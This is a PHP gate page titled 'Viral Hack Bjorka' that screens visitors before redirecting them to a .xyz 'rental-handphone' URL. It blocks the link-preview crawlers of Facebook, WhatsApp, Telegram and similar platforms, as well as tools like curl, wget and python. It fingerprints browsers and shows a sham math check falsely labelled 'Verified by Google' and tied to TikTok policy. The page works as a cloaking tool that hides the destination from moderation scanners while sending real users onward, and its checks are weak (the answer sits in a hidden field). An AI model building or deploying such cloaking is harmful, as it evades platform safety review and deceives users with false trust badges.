<?php
ini_set('display_errors', 0);
date_default_timezone_set('UTC');

$redirectURL = "https://companyogahkaya.xyz/rental-handphone";
$logDir = __DIR__ . '/logs';
$logFile = $logDir . '/antibot.log';

$RATE_LIMIT_MAX = 8;
$RATE_LIMIT_WINDOW = 60;

$USE_REDIS = true;
$REDIS_HOST = '127.0.0.1';
$REDIS_PORT = 6379;
$REDIS_DB = 0;
$REDIS_PREFIX = 'antibot:';

$IP_REPUTATION_API_KEY = '';
$IP_REPUTATION_PROVIDER = 'ipqualityscore';
$IP_REPUTATION_BLOCK_SCORE = 80;

$MIN_RESPONSE_SECONDS = 2;

if (!is_dir($logDir))
    @mkdir($logDir, 0750, true);

session_start();

function logger($data)
{
    global $logFile;
    $entry = ['time' => gmdate('Y-m-d H:i:s'), 'data' => $data];
    @file_put_contents($logFile, json_encode($entry, JSON_UNESCAPED_SLASHES) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function client_ip()
{
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($parts[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function safe_post($k)
{
    return $_POST[$k] ?? null;
}

// Redis init
$redis = null;
if ($USE_REDIS && class_exists('Redis')) {
    try {
        $r = new Redis();
        $r->connect($REDIS_HOST, $REDIS_PORT, 1.0);
        $r->select($REDIS_DB);
        $redis = $r;
    } catch (Exception $e) {
        logger(['notice' => 'redis_connect_failed', 'err' => $e->getMessage()]);
    }
}

if (!isset($_SESSION['session_secret_prev']))
    $_SESSION['session_secret_prev'] = null;
$prev_secret = $_SESSION['session_secret_prev'] ?? null;

if (empty($_SESSION['session_secret']))
    $_SESSION['session_secret'] = bin2hex(random_bytes(32));
$session_secret = $_SESSION['session_secret'];

// Block bad user agents
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ua_blocklist = [
    'facebook',
    'facebot',
    'instagram',
    'whatsapp',
    'meta',
    'curl',
    'wget',
    'python',
    'go-http-client',
    'node',
    'axios',
    'postman',
    'bot',
    'crawler',
    'spider',
    'scrapy',
    'headless',
    'phantom',
    'httpclient',
    'bingpreview',
    'yandex',
    'discordbot',
    'telegrambot',
    'slurp'
];
foreach ($ua_blocklist as $pattern) {
    if ($pattern !== '' && strpos($userAgent, $pattern) !== false) {
        header('HTTP/1.1 403 Forbidden');
        logger(['event' => 'ua_block', 'ua' => $userAgent, 'ip' => client_ip()]);
        exit('<h1>ACCESS DENIED</h1>');
    }
}

// Require JS cookie
if (!isset($_COOKIE['js_enabled'])) {
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Enable JS</title></head><body>';
    echo '<script>
    document.cookie="js_enabled=1; path=/";
    try{ const fp=btoa(navigator.userAgent+"|"+screen.width+"x"+screen.height+"|"+navigator.language+"|"+(navigator.hardwareConcurrency||0));
    document.cookie="fingerprint="+fp+"; path=/"; }catch(e){}
    location.reload();
    </script></body></html>';
    exit;
}

// Honeypot
$honeypot = safe_post('nickname') ?? '';
if (!empty($honeypot)) {
    logger(['event' => 'honeypot_filled', 'ip' => client_ip(), 'ua' => $userAgent]);
    header('HTTP/1.1 403 Forbidden');
    exit('<h1>BOT DETECTED</h1>');
}

// Fingerprint check
$cookie_fp = $_COOKIE['fingerprint'] ?? '';
if ($cookie_fp === '') {
    logger(['event' => 'missing_fp_cookie', 'ip' => client_ip()]);
    header('HTTP/1.1 403 Forbidden');
    exit('<h1>JS fingerprint missing</h1>');
}
if (!isset($_SESSION['fp']))
    $_SESSION['fp'] = $cookie_fp;
elseif ($_SESSION['fp'] !== $cookie_fp) {
    logger(['event' => 'fp_mismatch', 'ip' => client_ip(), 'cookie' => $cookie_fp, 'session' => $_SESSION['fp']]);
    header('HTTP/1.1 403 Forbidden');
    exit('<h1>Fingerprint mismatch</h1>');
}

// Rate limit function
function rate_limit_check($key, $max, $window, $redis = null)
{
    if ($redis) {
        try {
            $count = $redis->incr($key);
            if ($count === 1)
                $redis->expire($key, $window);
            return ($count <= $max);
        } catch (Exception $e) {
            logger(['notice' => 'redis_rate_limit_error', 'err' => $e->getMessage()]);
            return true;
        }
    } else {
        $file = sys_get_temp_dir() . '/antibot_' . md5($key);
        $data = ['count' => 0, 'exp' => 0];
        if (file_exists($file))
            $data = json_decode(@file_get_contents($file), true) ?: $data;
        $now = time();
        if ($now > ($data['exp'] ?? 0))
            $data = ['count' => 1, 'exp' => $now + $window];
        else
            $data['count'] = ($data['count'] ?? 0) + 1;
        @file_put_contents($file, json_encode($data));
        return ($data['count'] <= $max);
    }
}

$ident = 'ip:' . client_ip() . ':fp:' . substr($cookie_fp, 0, 16);
$rl_key = $REDIS_PREFIX . $ident;
if (!rate_limit_check($rl_key, $RATE_LIMIT_MAX, $RATE_LIMIT_WINDOW, $redis)) {
    logger(['event' => 'rate_limited', 'ident' => $ident, 'ip' => client_ip()]);
    header('HTTP/1.1 429 Too Many Requests');
    exit('<h1>Too many requests — try later</h1>');
}

// IP Reputation
function ip_reputation_check($ip, $api_key, $provider = 'ipqualityscore')
{
    if (empty($api_key))
        return ['ok' => true, 'detail' => 'no_api'];
    $url = 'https://ipqualityscore.com/api/json/ip/' . rawurlencode($api_key) . '/' . rawurlencode($ip);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($res === false) {
        logger(['notice' => 'iprep_curl_failed', 'err' => $err]);
        return ['ok' => true];
    }
    $json = json_decode($res, true);
    $score = $json['fraud_score'] ?? 0;
    $is_proxy = $json['proxy'] ?? false;
    return ['ok' => ($score < 80 && !$is_proxy), 'score' => $score];
}

$iprep = ip_reputation_check(client_ip(), $IP_REPUTATION_API_KEY, $IP_REPUTATION_PROVIDER);
if (isset($iprep['score']) && $iprep['score'] >= $IP_REPUTATION_BLOCK_SCORE) {
    logger(['event' => 'ip_reputation_block', 'ip' => client_ip(), 'score' => $iprep['score']]);
    header('HTTP/1.1 403 Forbidden');
    exit('<h1>ACCESS DENIED — suspicious IP</h1>');
}

// Process form
$userAnswer = safe_post('answer');
$posted_token = safe_post('session_token') ?? '';
$posted_hmac = safe_post('token_hmac') ?? '';
$start_time = (int) (safe_post('start_time') ?? 0);

$status = 'pending';
$notes = [];

if ($userAnswer !== null) {
    if (empty($posted_token) || empty($posted_hmac)) {
        $status = 'denied';
        $notes[] = 'missing_token_or_hmac';
    } else {
        $valid = false;
        $calc1 = hash_hmac('sha256', $posted_token, $session_secret);
        if (hash_equals($calc1, $posted_hmac))
            $valid = true;
        if (!$valid && !empty($prev_secret)) {
            $calc2 = hash_hmac('sha256', $posted_token, $prev_secret);
            if (hash_equals($calc2, $posted_hmac))
                $valid = true;
        }
        if (!$valid) {
            $status = 'denied';
            $notes[] = 'hmac_invalid';
        } elseif (!isset($_SESSION['session_token']) || !hash_equals($_SESSION['session_token'], $posted_token)) {
            $status = 'denied';
            $notes[] = 'token_mismatch';
        } elseif (!isset($_COOKIE['human_active'])) {
            $status = 'denied';
            $notes[] = 'no_human_active';
        } else {
            $elapsed = $start_time ? (time() - $start_time) : 0;
            if ($elapsed < $MIN_RESPONSE_SECONDS) {
                $status = 'denied';
                $notes[] = 'too_fast';
            } else {
                $correctAnswer = safe_post('correct_answer') ?? '';
                if (trim(strtolower($userAnswer)) === trim(strtolower($correctAnswer)))
                    $status = 'granted';
                else {
                    $status = 'denied';
                    $notes[] = 'wrong_answer';
                }
            }
        }
    }
    logger(['event' => 'form_submission', 'ip' => client_ip(), 'status' => $status, 'notes' => $notes]);
}

if ($status === 'granted' || $status === 'denied') {
    $_SESSION['session_secret_prev'] = $_SESSION['session_secret'];
    $_SESSION['session_secret'] = bin2hex(random_bytes(32));
    unset($_SESSION['session_token']);
}
?>
<!doctype html>
<html lang="id">

<head>
    <meta charset="utf-8">
    <title>Viral Hack Bjorka</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #7b61ff;
            --bg-gradient: linear-gradient(135deg, #a18cd1 0%, #fbc2eb 100%);
            --border: rgba(255, 255, 255, 0.3);
            --text: #202124;
            --text-secondary: #5f6368
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0
        }

        body {
            background: var(--bg-gradient);
            font-family: 'Inter', sans-serif;
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            padding: 20px;
            background-attachment: fixed;
            background-size: cover;
            animation: gradientShift 12s ease-in-out infinite alternate
        }

        @keyframes gradientShift {
            from {
                background: linear-gradient(135deg, #a18cd1 0%, #fbc2eb 100%)
            }

            to {
                background: linear-gradient(135deg, #d8b4fe 0%, #f9a8d4 100%)
            }
        }

        .box {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 16px;
            width: 100%;
            max-width: 380px;
            padding: 32px 28px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15)
        }

        h1 {
            font-size: 22px;
            font-weight: 600;
            color: var(--primary);
            margin-bottom: 10px;
            text-align: center
        }

        .desc {
            font-size: 14px;
            color: var(--text-secondary);
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.5
        }

        .q-box {
            background: linear-gradient(135deg, rgba(123, 97, 255, 0.15), rgba(249, 168, 212, 0.15));
            border: 1px solid rgba(123, 97, 255, 0.25);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 16px;
            text-align: center;
            box-shadow: 0 2px 6px rgba(123, 97, 255, 0.2)
        }

        .q {
            font-weight: 600;
            color: #2b2b2b;
            font-size: 18px
        }

        input[type=text] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color .2s, box-shadow .2s
        }

        input[type=text]:focus {
            border-color: var(--primary);
            box-shadow: 0 0 6px rgba(123, 97, 255, 0.3)
        }

        button {
            width: 100%;
            background: var(--primary);
            color: white;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            padding: 10px 0;
            font-size: 16px;
            cursor: pointer;
            margin-top: 16px;
            transition: transform .2s, background .2s
        }

        button:hover {
            background: #6941ff;
            transform: scale(1.03)
        }

        .good {
            text-align: center;
            color: #188038;
            font-weight: 500;
            margin-top: 10px
        }

        .bad {
            text-align: center;
            color: #d93025;
            font-weight: 500;
            margin-top: 10px
        }

        .footer-note {
            text-align: center;
            font-size: 12px;
            color: var(--text-secondary);
            margin-top: 20px
        }
    </style>
    <script>
        function setCookie(n, v, d) { const t = new Date(); t.setTime(t.getTime() + d * 86400000); document.cookie = n + '=' + v + ';path=/;expires=' + t.toUTCString(); }
        ['mousemove', 'keydown', 'touchstart', 'click'].forEach(e => window.addEventListener(e, () => setCookie('human_active', '1', 1), { once: true }));
    </script>
</head>

<body>
    <div class="box">
        <h1>TERMS AND PRIVACY POLICY</h1>
        <div class="desc">
            VERIFIKASI KELAYAKAN.<br>
            Harap mematuhi kebijakan dari tiktok sebelum mengakses situs ini, silahkan jawab dengan benar.
        </div>

        <?php if ($status === 'pending'):
            $a = rand(1, 10);
            $b = rand(1, 10);
            $display_q = "$a + $b";
            $display_ans = $a + $b;
            $_SESSION['session_token'] = bin2hex(random_bytes(16));
            $tok = $_SESSION['session_token'];
            $hmac = hash_hmac('sha256', $tok, $_SESSION['session_secret']);
            ?>
            <form method="post">
                <div class="q-box">
                    <div class="q"><?= htmlspecialchars($display_q) ?> = ?</div>
                </div>
                <input type="hidden" name="start_time" value="<?= time() ?>">
                <input type="hidden" name="correct_answer" value="<?= htmlspecialchars($display_ans) ?>">
                <input type="hidden" name="session_token" value="<?= htmlspecialchars($tok) ?>">
                <input type="hidden" name="token_hmac" value="<?= htmlspecialchars($hmac) ?>">
                <input type="text" name="answer" placeholder="Masukkan jawaban..." required autocomplete="off">
                <button type="submit">Verifikasi</button>
            </form>
            <div class="footer-note">Verified by Google • Sistem keamanan adaptif</div>

        <?php elseif ($status === 'granted'): ?>
            <p class="good">✅ Verifikasi sukses — Anda akan diarahkan...</p>
            <script>setTimeout(() => { location.href = <?= json_encode($redirectURL) ?> }, 1200);</script>

        <?php else: ?>
            <p class="bad">❌ Verifikasi gagal — silakan coba lagi.</p>
            <form method="get"><button type="submit">Ulangi</button></form>
        <?php endif; ?>
    </div>
</body>

</html>